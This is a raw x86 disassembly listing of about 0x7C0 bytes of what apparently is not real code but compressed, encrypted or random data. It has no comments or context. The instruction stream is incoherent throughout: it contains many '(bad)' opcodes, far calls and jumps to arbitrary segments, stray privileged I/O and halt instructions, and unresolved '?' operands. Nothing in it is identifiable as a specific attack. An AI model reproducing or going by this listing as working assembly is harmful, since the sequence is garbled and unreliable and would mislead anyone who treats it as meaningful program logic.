  4425cf:	rol    DWORD PTR ds:0x584e5282,1
  4425d5:	fbld   TBYTE PTR [eax]
  4425d7:	adc    cl,BYTE PTR [ebx+0x6ac23185]
  4425dd:	shr    DWORD PTR [ecx],1
  4425df:	push   ebx
  4425e0:	ret    0x78e
  4425e3:	or     BYTE PTR [ebx+0x72],0xfa
  4425e7:	mov    bl,0xbd
  4425e9:	add    BYTE PTR [ecx+0x731aecf6],al
  4425ef:	cmp    ah,BYTE PTR [ecx-0x5e]
  4425f2:	pop    edi
  4425f3:	dec    ebp
  4425f4:	inc    esp
  4425f5:	adc    eax,0x5cd47082
  4425fa:	dec    edx
  4425fb:	mov    ch,0x6b
  4425fd:	inc    eax
  4425fe:	js     0x442622
  442600:	mov    al,0x28
  442602:	mov    dl,0xa3
  442604:	jbe    0x4425c5
  442606:	fldenv [ebp-0x441527f]
  44260c:	call   0x159a:0xbc1a71a6
  442613:	pop    esp
  442614:	pop    ebx
  442615:	xor    dh,BYTE PTR [esi+edi*1+0x1d2b3640]
  44261c:	dec    esi
  44261d:	mov    eax,ds:0xda2dcaa1
  442622:	mov    ds:0x84a0ba68,al
  442627:	mov    dl,0x2e
  442629:	test   esp,edi
  44262b:	test   al,0xdc
  44262d:	push   cs
  44262e:	jle    0x442632
  442630:	stos   DWORD PTR es:[edi],eax
  442631:	sub    dl,al
  442633:	outs   dx,BYTE PTR ds:[esi]
  442634:	cld    
  442635:	(bad)  
  442636:	jno    0x442674
  442638:	mov    cl,0x8e
  44263a:	pop    ss
  44263b:	add    edi,0x57490412
  442641:	ss jne 0x44266c
  442644:	mov    ds:0xce0264eb,eax
  442649:	xsave  [esi]
  44264c:	adc    BYTE PTR [esi],bh
  44264e:	rcr    al,1
  442650:	clc    
  442651:	cmc    
  442652:	mov    BYTE PTR [eax],dh
  442654:	lods   eax,DWORD PTR ds:[esi]
  442655:	jmp    0xa384a96
  44265a:	and    al,BYTE PTR [edx-0x4151fb51]
  442660:	je     0x442636
  442662:	sahf   
  442663:	or     BYTE PTR [eax+0x3eea107d],bl
  442669:	xchg   ecx,eax
  44266a:	push   edi
  44266b:	stos   BYTE PTR es:[edi],al
  44266c:	shl    BYTE PTR [ebx],0xcc
  44266f:	je     0x4426c1
  442671:	xchg   ebx,eax
  442672:	shl    BYTE PTR [edx+0x8],0xe8
  442676:	pop    es
  442677:	sub    BYTE PTR [ecx],0x72
  44267a:	or     al,0xd9
  44267c:	ret    0x82aa
  44267f:	jno    0x4426c9
  442681:	sbb    eax,0xa10ca178
  442686:	mov    ds:0x78fdbce0,eax
  44268b:	add    ecx,DWORD PTR [esi+0x1f]
  44268e:	pop    ebx
  44268f:	sti    
  442690:	xchg   esp,eax
  442691:	push   ebp
  442692:	xchg   edx,eax
  442693:	jle    0x442697
  442695:	mov    ds:0xbf6aa1b8,al
  44269a:	rcl    BYTE PTR [ecx+0x10],1
  44269d:	lods   al,BYTE PTR ds:[esi]
  44269e:	xor    BYTE PTR [eax],dl
  4426a0:	ss jbe 0x442633
  4426a3:	imul   BYTE PTR [esi]
  4426a5:	dec    eax
  4426a6:	xor    eax,0x26fe7ab2
  4426ab:	cmp    ch,BYTE PTR [ecx+0x16]
  4426ae:	sub    al,0xfd
  4426b0:	test   DWORD PTR es:[edx+0xe],eax
  4426b4:	shl    BYTE PTR [edi-0x28],0x20
  4426b8:	mov    dl,0xf1
  4426ba:	sbb    ch,BYTE PTR [ecx-0x2c]
  4426bd:	adc    al,0x4b
  4426bf:	adc    eax,0x90f03687
  4426c4:	push   edx
  4426c5:	stos   DWORD PTR es:[edi],eax
  4426c6:	sbb    DWORD PTR [eax+0x35],ebp
  4426c9:	inc    eax
  4426ca:	in     eax,dx
  4426cb:	xor    DWORD PTR [ecx+0x275850fe],ecx
  4426d1:	push   ss
  4426d2:	adc    eax,0xf0a6076a
  4426d7:	ins    BYTE PTR es:[edi],dx
  4426d8:	ins    DWORD PTR es:[edi],dx
  4426d9:	mov    edx,DWORD PTR [edx-0x1b]
  4426dc:	xchg   esp,eax
  4426dd:	mov    ebp,0x2c0831c0
  4426e2:	jp     0x4426e0
  4426e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4426e5:	sub    al,0xf6
  4426e7:	push   0x28
  4426e9:	adc    BYTE PTR [ebx-0x6a],al
  4426ec:	ror    BYTE PTR [edx-0x14],cl
  4426ef:	test   al,0x4c
  4426f1:	ins    DWORD PTR es:[edi],dx
  4426f2:	adc    al,BYTE PTR [ebx-0x6c]
  4426f5:	mov    dl,0xe2
  4426f7:	pop    esi
  4426f8:	sbb    eax,0x169f52c6
  4426fd:	xchg   edx,eax
  4426fe:	jno    0x44277a
  442700:	stos   BYTE PTR es:[edi],al
  442701:	jmp    0x9b52:0x6c4d2f08
  442708:	inc    edi
  442709:	cld    
  44270a:	stos   DWORD PTR es:[edi],eax
  44270b:	cmp    esi,DWORD PTR [eax]
  44270d:	or     ch,ah
  44270f:	ins    DWORD PTR es:[edi],dx
  442710:	sar    BYTE PTR [edx+0x6],0x8f
  442714:	add    BYTE PTR ss:0x66461c87,0xbf
  44271c:	xor    al,0x63
  44271e:	or     BYTE PTR [eax-0x45],ah
  442721:	xor    al,BYTE PTR [ebx+0xa]
  442724:	adc    cl,bh
  442726:	mov    BYTE PTR [esi+esi*2],dh
  442729:	mov    ch,0x4e
  44272b:	mov    ds:0x3223761a,al
  442730:	out    0xef,al
  442732:	call   0x623f:0x2d70d50
  442739:	sub    BYTE PTR gs:[esi-0x5bdd595b],cl
  442740:	or     dh,0x30
  442743:	shl    al,1
  442745:	retf   
  442746:	(bad)  
  442747:	mov    ss,WORD PTR [ebp+0xa3fa4a2]
  44274d:	mov    ds:0x1635e22b,eax
  442752:	fsubr  QWORD PTR [eax]
  442754:	enter  0xce0e,0x2e
  442758:	in     al,0xc0
  44275a:	inc    eax
  44275b:	mov    bh,0x89
  44275d:	in     al,0xa0
  44275f:	jmp    0x442761
  442761:	mov    al,0x94
  442763:	jle    0x44273b
  442765:	push   ecx
  442766:	clc    
  442767:	push   cs
  442768:	sbb    eax,DWORD PTR [esi+eax*2-0x234ded15]
  44276f:	dec    edi
  442770:	mov    ds:0x56c03420,al
  442775:	icebp  
  442776:	dec    eax
  442777:	add    dl,BYTE PTR [esi+0x22ca2857]
  44277d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44277e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44277f:	stos   BYTE PTR es:[edi],al
  442780:	lods   eax,DWORD PTR ds:[esi]
  442781:	mov    bh,0x14
  442783:	mov    ds:0x6b40f0d4,eax
  442788:	xchg   edi,eax
  442789:	ss cwde 
  44278b:	bound  eax,QWORD PTR [eax-0x5925c2d8]
  442791:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  442792:	stos   BYTE PTR es:[edi],al
  442793:	jo     0x44277d
  442795:	aaa    
  442796:	mov    eax,0x484fc780
  44279b:	loope  0x44274e
  44279d:	lods   al,BYTE PTR ds:[esi]
  44279e:	stos   DWORD PTR es:[edi],eax
  44279f:	sar    BYTE PTR [ecx],1
  4427a1:	hlt    
  4427a2:	nop
  4427a3:	push   esi
  4427a4:	sbb    cl,dh
  4427a6:	xor    BYTE PTR [ecx-0x12],dl
  4427a9:	out    dx,al
  4427aa:	out    0xe5,eax
  4427ac:	call   0x98933015
  4427b1:	clc    
  4427b2:	pop    ss
  4427b3:	xchg   esp,eax
  4427b4:	lods   eax,DWORD PTR ds:[esi]
  4427b5:	in     eax,dx
  4427b6:	adc    BYTE PTR [edx+0x24],al
  4427b9:	inc    edx
  4427ba:	icebp  
  4427bb:	mov    ch,0x6a
  4427bd:	div    DWORD PTR [edi+ebp*1]
  4427c0:	test   al,0xad
  4427c2:	or     ebx,DWORD PTR [ebx-0x40]
  4427c5:	test   al,0x1a
  4427c7:	mov    dh,cl
  4427c9:	adc    BYTE PTR [esi],0x54
  4427cc:	fsubr  DWORD PTR [esi-0x18]
  4427cf:	mov    bl,BYTE PTR [eax+0x50]
  4427d2:	lock add edx,ebx
  4427d5:	cdq    
  4427d6:	cld    
  4427d7:	pop    edi
  4427d8:	mov    ah,0x78
  4427da:	xlat   BYTE PTR ds:[ebx]
  4427db:	sub    ch,BYTE PTR [ebp-0x788dae9d]
  4427e1:	ss jbe 0x44282a
  4427e4:	loop   0x44277e
  4427e6:	add    BYTE PTR [ecx+edi*4-0x75595b4c],cl
  4427ed:	sbb    eax,0xa02dff1e
  4427f2:	mov    ebp,0x3558906a
  4427f7:	test   eax,0x88eee076
  4427fc:	inc    ebp
  4427fd:	xor    BYTE PTR [esi-0x557be854],0x9
  442804:	into   
  442805:	mov    edi,0xeb215cac
  44280a:	add    esp,DWORD PTR [esp+ecx*2-0x2bb8c5c4]
  442811:	and    DWORD PTR [ecx],edi
  442813:	jo     0x442835
  442815:	lods   al,BYTE PTR ds:[esi]
  442816:	cs pushf 
  442818:	mov    BYTE PTR [eax+0x61],dh
  44281b:	jmp    0xa13a:0x93a4b4a3
  442822:	test   BYTE PTR [edx-0x1d83d9df],cl
  442828:	call   0x5fe82e19
  44282d:	ficomp DWORD PTR [ebx-0x4e]
  442830:	in     al,dx
  442831:	sub    bl,BYTE PTR fs:[edx-0x54fcbb0c]
  442838:	pusha  
  442839:	int3   
  44283a:	repz jb 0x4427cc
  44283d:	or     DWORD PTR [eax+0x0],esp
  442840:	xchg   DWORD PTR [esi+0x7c],ecx
  442843:	add    eax,0x6ad034bc
  442848:	add    al,0xfe
  44284a:	xlat   BYTE PTR ds:[ebx]
  44284b:	ret    0xd586
  44284e:	cmp    ch,BYTE PTR [ebx+edi*4-0x2e8362ac]
  442855:	sub    esp,eax
  442857:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  442858:	mov    al,ds:0xb0dade1e
  44285d:	add    BYTE PTR [ebx-0x1e5132f4],bh
  442863:	clc    
  442864:	push   0xffffff8d
  442866:	dec    ebx
  442867:	mov    edx,ds
  442869:	dec    edx
  44286a:	adc    ecx,ebx
  44286c:	ror    BYTE PTR [edi],1
  44286e:	add    BYTE PTR [eax+0x27],bh
  442871:	or     al,0xf2
  442873:	xor    al,0xad
  442875:	loopne 0x44289f
  442877:	cmp    esi,DWORD PTR [ecx+edi*4+0x16]
  44287b:	aas    
  44287c:	mov    ebp,0x323a42a8
  442881:	mov    ch,0x22
  442883:	test   BYTE PTR [eax+0x1e],dl
  442886:	push   es
  442887:	jnp    0x4428c9
  442889:	je     0x442847
  44288b:	mov    ch,0x60
  44288d:	dec    edi
  44288e:	pusha  
  44288f:	(bad)  
  442890:	(bad)  
  442891:	aad    0x10
  442893:	(bad)  
  442894:	aam    0x76
  442896:	shl    BYTE PTR [eax+ecx*2],1
  442899:	cmp    al,0x79
  44289b:	cmp    esi,DWORD PTR [edx-0x66498a80]
  4428a1:	or     bl,BYTE PTR [ebx]
  4428a3:	add    BYTE PTR [bx+si-0x5b04],dl
  4428a8:	mov    al,0xa1
  4428aa:	xchg   BYTE PTR [eax+0x7840d17c],al
  4428b0:	aam    0x4b
  4428b2:	ret    0x2597
  4428b5:	cli    
  4428b6:	je     0x4428f8
  4428b8:	call   0x70ad83c0
  4428bd:	ficom  DWORD PTR [edx-0x53]
  4428c0:	mov    ebx,0xa25db010
  4428c5:	xor    BYTE PTR [eax],al
  4428c7:	cmp    BYTE PTR [esi-0x40],dh
  4428ca:	scas   eax,DWORD PTR es:[edi]
  4428cb:	mov    cl,dh
  4428cd:	inc    eax
  4428ce:	(bad)  
  4428cf:	cmc    
  4428d0:	add    BYTE PTR [edx+0x49],ch
  4428d3:	and    BYTE PTR [edx-0x12],ah
  4428d6:	sub    al,0xf
  4428d8:	add    DWORD PTR fs:[eax-0x54],edi
  4428dc:	shr    DWORD PTR [ebp+0x6c],1
  4428df:	xor    dh,0x71
  4428e2:	cld    
  4428e3:	adc    eax,0xb67e26d7
  4428e8:	mov    dl,0x17
  4428ea:	push   esi
  4428eb:	push   ds
  4428ec:	adc    BYTE PTR [eax+ebx*8-0x6a],dl
  4428f0:	xchg   ebx,eax
  4428f1:	mov    dl,0xbb
  4428f3:	retf   0xfc
  4428f6:	das    
  4428f7:	sub    DWORD PTR [eax+0x79189092],esp
  4428fd:	cmp    ch,ch
  4428ff:	dec    eax
  442900:	(bad)  
  442901:	psrld  mm5,mm1
  442904:	push   ebp
  442905:	imul   BYTE PTR [eax+0x6a]
  442908:	ret    
  442909:	nop
  44290a:	push   0xffffff87
  44290c:	push   ebx
  44290d:	inc    esi
  44290e:	jb     0x4428ba
  442910:	mov    bh,0x66
  442912:	dec    edi
  442913:	add    DWORD PTR [ebx],ebp
  442915:	sbb    al,0x70
  442917:	xchg   esp,eax
  442918:	sti    
  442919:	int3   
  44291a:	adc    al,BYTE PTR [edi+edx*8+0x22bab6a4]
  442921:	rcl    DWORD PTR [esi],0xec
  442924:	(bad)  
  442925:	mov    esi,0x24ff8011
  44292a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44292b:	jb     0x442927
  44292d:	add    BYTE PTR [ebp+0x5d4b7a64],cl
  442933:	and    dl,bl
  442935:	pusha  
  442936:	inc    eax
  442937:	sbb    edi,DWORD PTR [eax+edx*4]
  44293a:	cmp    BYTE PTR [edx],0xa8
  44293d:	das    
  44293e:	test   al,0xc
  442940:	aam    0x2a
  442942:	xor    eax,DWORD PTR [ecx-0x4e]
  442945:	fild   QWORD PTR [ebp+edi*1-0x537f593e]
  44294c:	pop    edx
  44294d:	popa   
  44294e:	sbb    esp,DWORD PTR [eax-0x60]
  442951:	inc    ecx
  442952:	mov    esp,ebp
  442954:	daa    
  442955:	sub    dh,dl
  442957:	mov    ebp,0xf134fd77
  44295c:	cwde   
  44295d:	dec    BYTE PTR [ebx]
  44295f:	lods   al,BYTE PTR ds:[esi]
  442960:	aam    0x3e
  442962:	(bad)  
  442963:	cmc    
  442964:	fcmovnbe st,st(0)
  442966:	sub    edi,DWORD PTR [esi-0x6]
  442969:	xor    bl,BYTE PTR [edx]
  44296b:	jle    0x44294b
  44296d:	fwait
  44296e:	add    DWORD PTR [edx-0x7a],edi
  442971:	sub    BYTE PTR [ebx],ch
  442973:	adc    al,BYTE PTR [eax+0x2f]
  442976:	(bad)  
  442977:	or     esi,eax
  442979:	dec    edi
  44297a:	or     BYTE PTR [edx+0x33],dh
  44297d:	jl     0x442934
  44297f:	jbe    0x73f93475
  442985:	sub    BYTE PTR [ecx],0x26
  442988:	(bad)  
  442989:	cld    
  44298a:	es mov bl,0x8f
  44298d:	daa    
  44298e:	mov    esi,0x6aaa3060
  442993:	call   0x2e0a:0x57850b0
  44299a:	add    edi,ebx
  44299c:	and    esp,DWORD PTR [eax]
  44299e:	test   al,0x3e
  4429a0:	mov    esp,0xd78c625
  4429a5:	xchg   edx,eax
  4429a6:	mov    DWORD PTR [eax-0x4a],ebp
  4429a9:	popf   
  4429aa:	dec    edi
  4429ab:	cmp    dl,BYTE PTR [edx-0x35]
  4429ae:	hlt    
  4429af:	rcr    BYTE PTR [esi],1
  4429b1:	dec    ecx
  4429b2:	aad    0x58
  4429b4:	mov    bh,0xda
  4429b6:	fidiv  WORD PTR [ecx+0x48bc3de2]
  4429bc:	jp     0x442940
  4429be:	xchg   esi,eax
  4429bf:	in     eax,0x2
  4429c1:	out    dx,al
  4429c2:	add    BYTE PTR [ebp*4-0xacf17e8],al
  4429c9:	aam    0xba
  4429cb:	mov    dl,0x1b
  4429cd:	or     ch,BYTE PTR [esi]
  4429cf:	cmc    
  4429d0:	push   cs
  4429d1:	addr16 jnp 0x4429ba
  4429d4:	push   0xffffffea
  4429d6:	(bad)  
  4429d7:	clc    
  4429d8:	cdq    
  4429d9:	fld    QWORD PTR [ecx+eax*1]
  4429dc:	sub    ecx,DWORD PTR [eax+esi*4]
  4429df:	sbb    al,0xc9
  4429e1:	rcl    BYTE PTR [ebp+0x68],1
  4429e4:	bound  esi,QWORD PTR [edx+esi*8+0x2]
  4429e8:	push   eax
  4429e9:	mov    dh,0x77
  4429eb:	(bad)  
  4429ec:	inc    ebx
  4429ed:	push   ecx
  4429ee:	mov    edi,0x7853a2f6
  4429f3:	rol    BYTE PTR [ebx],1
  4429f5:	test   BYTE PTR ds:0xa235b497,al
  4429fc:	push   esp
  4429fd:	in     al,dx
  4429fe:	add    al,0xbd
  442a00:	in     eax,dx
  442a01:	shr    DWORD PTR [edx],0x32
  442a04:	(bad)  
  442a05:	test   esi,esi
  442a07:	jb     0x442a6d
  442a09:	mov    eax,ds:0xed82fcda
  442a0e:	adc    BYTE PTR [eax],al
  442a10:	fnstsw WORD PTR [eax+0x178655f]
  442a16:	add    BYTE PTR [ebx+0x73],ah
  442a19:	add    BYTE PTR [edi+0x551d3856],cl
  442a1f:	(bad)  
  442a20:	add    edx,DWORD PTR [esi]
  442a22:	in     al,dx
  442a23:	stc    
  442a24:	mov    ds:0x26b2acb5,al
  442a29:	push   eax
  442a2a:	inc    eax
  442a2b:	or     BYTE PTR [edx+ebp*8],bl
  442a2e:	sbb    eax,0x8e86ab6f
  442a33:	inc    esp
  442a34:	(bad)  
  442a35:	pop    ds
  442a36:	push   0x123b89e
  442a3b:	xchg   ecx,eax
  442a3c:	sub    BYTE PTR [edx+0xa],dl
  442a3f:	add    eax,0x943a1
  442a44:	push   esp
  442a45:	repnz add eax,0xd6d422f5
  442a4b:	mov    ecx,0x4b88c6ec
  442a50:	add    DWORD PTR [ebx-0x21],ebx
  442a53:	push   bp
  442a55:	lock sub BYTE PTR ds:0x504284c,dh
  442a5c:	out    0xfe,al
  442a5e:	push   ecx
  442a5f:	rol    DWORD PTR ds:0x4474f4aa,cl
  442a65:	or     al,ah
  442a67:	xchg   ebp,eax
  442a68:	mov    WORD PTR [edi-0x29],ss
  442a6b:	inc    ecx
  442a6c:	inc    ebx
  442a6d:	cmp    esp,eax
  442a6f:	(bad)  
  442a70:	lock xor eax,DWORD PTR [eax+eax*2-0x14]
  442a75:	cs pop edx
  442a77:	pop    edi
  442a78:	push   esp
  442a79:	or     esp,DWORD PTR [edx]
  442a7b:	stos   BYTE PTR es:[edi],al
  442a7c:	xor    al,0x2d
  442a7f:	mov    eax,ds:0xb26f0209
  442a84:	xor    DWORD PTR [eax],ecx
  442a86:	or     BYTE PTR [ebp+0x12],al
  442a89:	dec    esp
  442a8a:	popf   
  442a8b:	push   ds
  442a8c:	rcr    al,0x71
  442a8f:	xchg   esp,eax
  442a90:	mov    al,ds:0xdecb5b12
  442a95:	dec    ecx
  442a96:	mov    esp,0x901f8d23
  442a9b:	mov    al,ds:0x81766492
  442aa0:	jne    0x442acf
  442aa2:	jecxz  0x442a5b
  442aa4:	jbe    0x442b18
  442aa6:	shl    dl,0xa1
  442aa9:	dec    ebp
  442aaa:	test   eax,0x563a4422
  442aaf:	jo     0x442add
  442ab1:	mov    es,eax
  442ab3:	inc    edi
  442ab4:	loop   0x442ac9
  442ab6:	pop    eax
  442ab7:	inc    edx
  442ab8:	daa    
  442ab9:	inc    edx
  442aba:	das    
  442abb:	shl    DWORD PTR [ebx+eax*2-0x5d134260],0x2f
  442ac3:	sub    ah,bl
  442ac5:	push   es
  442ac6:	xchg   ebp,eax
  442ac7:	mov    ?,WORD PTR [ebp+ebx*2+0x7e142150]
  442ace:	or     BYTE PTR [esi],bh
  442ad0:	adc    eax,0x730043de
  442ad5:	mov    cl,0xc2
  442ad7:	and    BYTE PTR [edx+0x5e281016],ch
  442add:	push   eax
  442ade:	xor    al,0x1e
  442ae0:	or     DWORD PTR [esi+eax*4],edi
  442ae3:	shl    BYTE PTR [ecx-0x393ba197],cl
  442ae9:	dec    ebx
  442aea:	fcmovbe st,st(0)
  442aec:	pop    esi
  442aed:	jmp    0xdab1773c
  442af2:	jmp    0x442a7b
  442af4:	mov    al,ds:0x1bca1045
  442af9:	add    al,0x22
  442afb:	ss pop ebx
  442afd:	or     eax,0xb03c20e2
  442b02:	push   0x5ad08e89
  442b07:	adc    ebp,DWORD PTR [eax]
  442b09:	rol    BYTE PTR [esi+edx*1-0x61ea83cd],1
  442b10:	inc    ecx
  442b11:	cmp    eax,0x40c1fe10
  442b16:	repnz add al,0x8e
  442b19:	push   esi
  442b1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  442b1b:	ss mov edx,0xe1b20eb6
  442b21:	adc    dl,BYTE PTR [ebx]
  442b23:	jecxz  0x442ab6
  442b25:	ret    0x92a8
  442b28:	js     0x442b2b
  442b2a:	hlt    
  442b2b:	push   edx
  442b2c:	push   esi
  442b2d:	cli    
  442b2e:	sub    al,0x68
  442b30:	jge    0x442aff
  442b32:	jb     0x442b81
  442b34:	in     eax,dx
  442b35:	push   es
  442b36:	xchg   ebp,eax
  442b37:	add    dl,dh
  442b39:	push   es
  442b3a:	or     dh,ah
  442b3c:	inc    ecx
  442b3d:	push   edx
  442b3e:	clc    
  442b3f:	sub    DWORD PTR [edx],eax
  442b41:	xor    ch,BYTE PTR [esi]
  442b43:	popa   
  442b44:	pop    es
  442b45:	adc    al,0xb6
  442b47:	inc    ebx
  442b48:	ficom  WORD PTR [edx+0x76]
  442b4b:	call   0x12dbaff6
  442b50:	fild   DWORD PTR [edi]
  442b52:	test   DWORD PTR [ebx-0x22],eax
  442b55:	mov    ecx,0xe28f5dd6
  442b5a:	sbb    eax,DWORD PTR [eax]
  442b5c:	pop    esi
  442b5d:	enter  0x462a,0xfa
  442b61:	or     al,0xfc
  442b63:	xor    BYTE PTR [ecx+eax*2+0x36],dl
  442b67:	pop    edi
  442b68:	or     ah,al
  442b6a:	mov    fs,WORD PTR [esi]
  442b6c:	xchg   esi,eax
  442b6d:	mov    esi,0xf6c7506c
  442b72:	call   0x8e66:0x8ad05f6c
  442b79:	mul    BYTE PTR [esp+ecx*1-0x26]
  442b7d:	pop    esi
  442b7e:	dec    edx
  442b7f:	cwde   
  442b80:	inc    ebx
  442b81:	loopne 0x442b38
  442b83:	or     BYTE PTR [esi+0x6912f518],dh
  442b89:	mov    ah,0xb6
  442b8b:	or     esi,esp
  442b8d:	sub    DWORD PTR [edx+0x86aa7e2],eax
  442b93:	xor    BYTE PTR [esp+esi*4+0x1e],ah
  442b97:	or     bh,BYTE PTR [edx+ecx*8]
  442b9a:	pop    edx
  442b9b:	xchg   ecx,eax
  442b9c:	or     bl,ch
  442b9e:	or     BYTE PTR [ebp+0x58343e2e],ah
  442ba4:	pop    edx
  442ba5:	cmc    
  442ba6:	fcom   DWORD PTR [edx+edi*1]
  442ba9:	ss inc edi
  442bab:	jbe    0x442b49
  442bad:	mov    DWORD PTR ds:0x6b0bd92,eax
  442bb3:	(bad)  
  442bb4:	push   eax
  442bb5:	fcom   DWORD PTR cs:[edx*2-0x51ed3ba3]
  442bbd:	je     0x442b71
  442bbf:	data16 shl BYTE PTR [eax-0x1f],0xa0
  442bc4:	or     eax,0xfea50350
  442bc9:	xchg   BYTE PTR [edi+0x1],al
  442bcc:	pop    eax
  442bcd:	pop    esp
  442bce:	(bad)  
  442bcf:	and    al,0x6c
  442bd1:	retf   0x2202
  442bd4:	jecxz  0x442c21
  442bd6:	sar    BYTE PTR [esi+0x58],0x88
  442bda:	push   0xffffffbe
  442bdc:	cs or  eax,0xb8ce1175
  442be2:	mov    BYTE PTR [esi],ah
  442be4:	mov    cl,0xd1
  442be6:	ror    BYTE PTR [edx],1
  442be8:	fimul  WORD PTR [ecx+0x213e63ee]
  442bee:	fisubr DWORD PTR [ebx-0xa]
  442bf1:	sbb    BYTE PTR [esi+0x77],dl
  442bf4:	push   0xf4a026ae
  442bf9:	xchg   esi,eax
  442bfa:	out    dx,al
  442bfb:	jp     0x442c41
  442bfd:	add    ebx,DWORD PTR [ebx-0x76]
  442c00:	push   0xffffff8a
  442c02:	jne    0x442c68
  442c04:	push   ebx
  442c05:	pop    ecx
  442c06:	and    dl,BYTE PTR [esi]
  442c08:	pop    esp
  442c09:	xchg   ecx,eax
  442c0a:	sbb    al,0x66
  442c0c:	mov    ah,0xea
  442c0e:	hlt    
  442c0f:	clc    
  442c10:	mov    ah,0x80
  442c12:	pop    ds
  442c13:	sub    dl,dh
  442c15:	sbb    BYTE PTR [eax-0x80],al
  442c18:	and    eax,DWORD PTR [ecx+0x3b]
  442c1b:	call   0xc00b:0xc4d66e9
  442c22:	mov    ds:0x340646aa,al
  442c27:	je     0x442c73
  442c29:	mov    ds,edx
  442c2b:	mov    bl,0xd5
  442c2d:	icebp  
  442c2e:	mov    WORD PTR [eax-0x4d],?
  442c31:	sub    ax,0x2a96
  442c35:	call   0xc8a2:0xdc2ad8bd
  442c3c:	push   0x36
  442c3e:	mov    ds,WORD PTR [ebp+edi*8+0x3d]
  442c42:	xchg   ecx,eax
  442c43:	pop    edx
  442c44:	popa   
  442c45:	sub    al,0xb2
  442c47:	cmc    
  442c48:	mov    bh,0x98
  442c4a:	stos   DWORD PTR es:[edi],eax
  442c4b:	add    al,0x4
  442c4d:	int    0x77
  442c4f:	(bad)  
  442c50:	lock imul eax,DWORD PTR [eax],0xfffffffd
  442c54:	sub    DWORD PTR [ecx-0x64e5deb8],ebx
  442c5a:	call   0x6b38b6e9
  442c5f:	shl    BYTE PTR [ebx-0x18],0x17
  442c63:	outs   dx,BYTE PTR ds:[esi]
  442c64:	pop    ecx
  442c65:	sub    eax,0xd3136f1c
  442c6a:	mov    cl,0x7d
  442c6c:	ret    0xb002
  442c6f:	xchg   esp,eax
  442c70:	add    al,0x14
  442c72:	and    al,0xa2
  442c74:	lock rcl eax,1
  442c77:	add    al,BYTE PTR [eax]
  442c79:	and    eax,0xf9756865
  442c7e:	and    ecx,DWORD PTR [eax]
  442c80:	cld    
  442c81:	mov    al,0xec
  442c83:	sub    DWORD PTR [ebx],ebp
  442c85:	enter  0xb552,0x5a
  442c89:	(bad)  
  442c8a:	js     0x442cfe
  442c8c:	ret    0xb876
  442c8f:	cmp    BYTE PTR [ecx],0x99
  442c92:	push   0x6adc4fae
  442c97:	jecxz  0x442d0d
  442c99:	jo     0x442cd7
  442c9b:	dec    edx
  442c9c:	or     eax,0x76fea040
  442ca1:	fld    TBYTE PTR [esi*8+0x4c67d20b]
  442ca8:	pop    esp
  442ca9:	xchg   esp,eax
  442caa:	pusha  
  442cab:	mov    BYTE PTR [ecx+0x60],al
  442cae:	imul   edi,ebx,0x8251eca2
  442cb4:	mov    al,0x5b
  442cb6:	push   ss
  442cb7:	jle    0x442ccb
  442cb9:	clc    
  442cba:	push   ds
  442cbb:	cmp    ebx,DWORD PTR ds:0x7ef502a4
  442cc1:	push   ecx
  442cc2:	dec    edi
  442cc3:	pop    ds
  442cc4:	es test al,0x34
  442cc7:	mov    ecx,0xa1df13ac
  442ccc:	sub    eax,0xb55c047a
  442cd1:	ret    0x7ec5
  442cd4:	sub    BYTE PTR [eax+0x3c],bh
  442cd7:	or     al,al
  442cd9:	pop    es
  442cda:	fdivr  DWORD PTR [ebp+ebp*1+0x7a]
  442cde:	aad    0x5
  442ce0:	dec    ebp
  442ce1:	aam    0x76
  442ce3:	and    al,0x27
  442ce5:	test   DWORD PTR [esi],edx
  442ce7:	icebp  
  442ce8:	ds cli 
  442cea:	lods   eax,DWORD PTR ds:[esi]
  442ceb:	fdiv   DWORD PTR [edx]
  442ced:	cli    
  442cee:	push   ss
  442cef:	test   DWORD PTR [ebp-0x58],edx
  442cf2:	sub    al,bh
  442cf4:	shl    BYTE PTR [esi-0x5d],cl
  442cf7:	ins    DWORD PTR es:[edi],dx
  442cf8:	xor    BYTE PTR [edx+0xd74cec8],cl
  442cfe:	mov    ss,WORD PTR [esp+0x31]
  442d02:	lods   eax,DWORD PTR ds:[esi]
  442d03:	sub    edx,DWORD PTR [eax+0x73]
  442d06:	jmp    0xf393:0x5b0063b
  442d0d:	adc    ebp,edx
  442d0f:	push   ss
  442d10:	fcom   QWORD PTR fs:[esp+ebp*2]
  442d14:	inc    ebp
  442d15:	mov    BYTE PTR [esi-0x1bb9d3da],cl
  442d1b:	push   ds
  442d1c:	pop    edx
  442d1d:	add    eax,0xea03802
  442d22:	fs out 0x11,eax
  442d25:	mov    bh,al
  442d27:	and    BYTE PTR [eax+0x1c69277],bh
  442d2d:	or     DWORD PTR [ebx-0x1e],0x32021216
  442d34:	hlt    
  442d35:	push   edx
  442d36:	jp     0x442da8
  442d38:	push   esi
  442d39:	mov    edi,0x5e5042fe
  442d3e:	popa   
  442d3f:	lds    esp,FWORD PTR [ebx-0x6bd2bb0b]
  442d45:	(bad)  
  442d46:	fsubr  QWORD PTR [esi]
  442d48:	lds    esi,FWORD PTR [ecx+0x51]
  442d4b:	inc    eax
  442d4c:	sti    
  442d4d:	add    al,0x48
  442d4f:	int    0xdd
  442d51:	mov    esi,0x24bc296b
  442d56:	lock sahf 
  442d58:	lods   al,BYTE PTR ds:[esi]
  442d59:	iret   
  442d5a:	js     0x442d76
  442d5c:	or     edi,DWORD PTR [eax+0x5]
  442d5f:	jmp    0x666c:0x475ab007
  442d66:	outs   dx,BYTE PTR ds:[esi]
  442d67:	iret   
  442d68:	aam    0xf
  442d6a:	dec    ebx
  442d6b:	je     0x442d73
  442d6d:	into   
  442d6e:	hlt    
  442d6f:	sbb    cl,BYTE PTR [edi]
  442d71:	lods   al,BYTE PTR ds:[esi]
  442d72:	add    eax,0x1890080d
  442d77:	outs   dx,BYTE PTR ds:[esi]
  442d78:	aaa    
  442d79:	hlt    
  442d7a:	adc    al,0x7e
  442d7c:	sbb    eax,edx
  442d7e:	inc    ebx
  442d7f:	sbb    BYTE PTR [esi+edi*2],al
  442d82:	mov    esp,eax
  442d84:	mov    eax,ds:0x6a4c5db4
  442d89:	cs cmp ch,bh
